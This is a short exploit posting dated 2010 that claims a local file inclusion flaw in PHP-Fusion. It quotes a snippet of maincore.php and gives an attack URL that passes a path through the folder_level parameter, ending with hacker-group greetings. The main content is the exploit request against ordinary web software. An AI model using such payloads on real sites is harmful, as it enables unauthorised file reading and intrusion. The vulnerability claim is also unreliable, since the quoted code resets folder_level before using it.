# Exploit Title:   PHP-Fusion Local File Includes Vulnerability
# Date: 2010/08/15
# Author: MoDaMeR
# Email: k@live.ma
# My Sites : www.v4-team.com & www.hackteach.org
# Script home: http://www.phpfusion-ar.com
# download Script:
http://www.phpfusion-ar.com/downloads.php?cat_id=1&download_id=91
# Version:all
# Tested on: Linux
# Team hacker:Mr.Mo0oM & Dr.xp
                          فلسطين كلنا فداءً لكِ
                         :::::::::::::::::::::::::
=================Exploit=================
maincore.php
[php]
 // Locate config.php and set the basedir path
$folder_level = ""; $i = 0;
while (!file_exists($folder_level."config.php")) {
    $folder_level .= "../"; $i++;
    if ($i == 5) { die("Config file not found"); }
}
require_once $folder_level."config.php";
define("BASEDIR", $folder_level);
[/php]
----exploit----

http://{localhost}/{path}/maincore.php?folder_level=LFI

---------greatz----------
Greatz to :
aB0 m0h4mM3d , and all v4-team & hackteach members